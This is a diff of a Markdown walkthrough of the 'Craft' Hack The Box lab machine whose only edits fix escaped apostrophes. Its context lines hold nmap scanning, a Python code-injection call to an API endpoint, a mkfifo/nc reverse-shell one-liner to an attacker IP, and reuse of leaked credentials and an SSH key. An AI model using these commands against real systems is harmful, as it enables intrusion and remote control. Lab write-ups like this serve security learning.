@@ -43,7 +43,7 @@ Discovered open port 6022/tcp on 10.10.10.110
 Discovered open port 443/tcp on 10.10.10.110
 ```
 
-Hmm. `6022/tcp` sure looks interesting. Let\'s do one better with `nmap` scanning the discovered ports to establish their services.
+Hmm. `6022/tcp` sure looks interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.
 
 ```
 # nmap -n -v -Pn -p22,443,6022 -A --reason -oN nmap.txt 10.10.10.110
@@ -81,7 +81,7 @@ PORT     STATE SERVICE  REASON         VERSION
 |_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
 ```
 
-Looks like `6022/tcp` is some kind of SSH written in Go. Let\'s check the `ssl/http` service first. Here's what it looks like.
+Looks like `6022/tcp` is some kind of SSH written in Go. Let's check the `ssl/http` service first. Here's what it looks like.
 
 <a class="image-popup">
 ![8b0451fd.png](/assets/images/posts/craft-htb-walkthrough/8b0451fd.png)
@@ -156,7 +156,7 @@ curl -s \
      https://$HOST/api/brew/
 ```
 
-Let\'s get that reverse shell!
+Let's get that reverse shell!
 
 ```
 # ./craft.sh "__import__('os').system('rm -rf /tmp/p; mkfifo /tmp/p p; /bin/sh 0</tmp/p | nc 10.10.15.33 1234 >/tmp/p')"
@@ -192,7 +192,7 @@ And the MySQL service is listening as well.
 ![b9c9691a.png](/assets/images/posts/craft-htb-walkthrough/b9c9691a.png)
 </a>
 
-Now, how the hell do I connect to `db`? There\'s no `mysql` client here. It\'s important to leave no stones unturned during the information gathering phase.
+Now, how the hell do I connect to `db`? There's no `mysql` client here. It's important to leave no stones unturned during the information gathering phase.
 
 <a class="image-popup">
 ![ec46ac72.png](/assets/images/posts/craft-htb-walkthrough/ec46ac72.png)
@@ -238,7 +238,7 @@ Bam. More credentials. :triumph:
 
 ### Gilfoyle's Private Repository
 
-Gilfoyle\'s credentials are still active.
+Gilfoyle's credentials are still active.
 
 <a class="image-popup">
 ![e4c293f8.png](/assets/images/posts/craft-htb-walkthrough/e4c293f8.png)
@@ -250,13 +250,13 @@ Guess what. He has a private repository. Sneaky bastard. All the good stuff are 
 ![a95605e5.png](/assets/images/posts/craft-htb-walkthrough/a95605e5.png)
 </a>
 
-Armed with the SSH private, we can log into Gilfoyle\'s account.
+Armed with the SSH private, we can log into Gilfoyle's account.
 
 <a class="image-popup">
 ![285295eb.png](/assets/images/posts/craft-htb-walkthrough/285295eb.png)
 </a>
 
-Wait a minute. The private key must be password protected. Maybe it\'s the same password as the repo access?
+Wait a minute. The private key must be password protected. Maybe it's the same password as the repo access?
 
 <a class="image-popup">
 ![22cdce12.png](/assets/images/posts/craft-htb-walkthrough/22cdce12.png)
